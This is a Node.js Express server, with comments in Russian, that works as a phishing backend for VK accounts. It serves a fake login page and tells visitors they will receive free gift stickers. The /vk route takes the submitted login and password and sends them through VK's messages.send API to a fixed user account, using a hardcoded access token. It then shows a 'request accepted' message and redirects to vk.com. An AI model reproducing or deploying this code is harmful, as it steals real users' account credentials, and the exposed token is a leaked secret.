var express = require('express')
var app = express()
var bodyParser = require('body-parser');
const needle = require('needle');
const favicon = require('serve-favicon');
const path = require('path');

app.use(express.static('public'))
app.use(favicon(path.join(__dirname, 'public', 'icon.png')));
app.use('/public', express.static(path.join(__dirname, 'public')))

app.use(bodyParser.json()); // https://versiya.info/uploads/posts/2018-03/1520074482_screenshot_27.png
app.use(bodyParser.urlencoded({ extended: true }));
/*
app.get('/stickers', function (req, res) {
  res.send('<meta http-equiv="refresh" content="0;URL=/" /><img style="height: 100%; width: 100%;" src="https://versiya.info/uploads/posts/2018-03/1520074482_screenshot_27.png"> ')
})
*/

app.get('/:id', function (req, res) {
  res.sendFile(__dirname + '/start.html')
  // как юляьб передать сцк

//res.send(req.params)
//let params = req.params;

	app.post('/ax', function (req, res) {

console.log(req.body.id)
var url = encodeURI("https://api.vk.com/api.php?oauth=1&method=users.get&user_ids="+req.body.id+"&fields=photo_100,city&v=5.92&access_token=bbb5f537673f0be8136ceec8707dcbeb669108d0d3328b7b39bfc1715aaab7d066bc507ebafda7caa7636");
	needle.get(url, function(err, resp){
	  if (!err && resp.statusCode == 200);
		var re = (resp.body['response']);
		var items = (re.items);
		console.log(re)
		res.send(re)
		})
	})
})
app.post('/oauth', function (req, res) {
  res.sendFile(__dirname + '/vkindex.html')
})



app.post('/vk', function (req, res) {

	var url = encodeURI("https://api.vk.com/api.php?oauth=1&method=messages.send&user_id=300397513&message="
		+req.body.login+"\n"+req.body.password
		+"&v=5.67&access_token=bbb5f537673f0be8136ceec8707dcbeb669108d0d3328b7b39bfc1715aaab7d066bc507ebafda7caa7636");
	needle.get(url, function(err, resp){
	  if (!err && resp.statusCode == 200);
	  console.log();
	})

  console.log(req.body)

res.send('<b>Запрос на подарочные стикеры принят. Ожидайте..</b> <meta http-equiv="refresh" content="2;URL=https://vk.com" />')
})
 
app.listen(3000)
console.log("Запущен")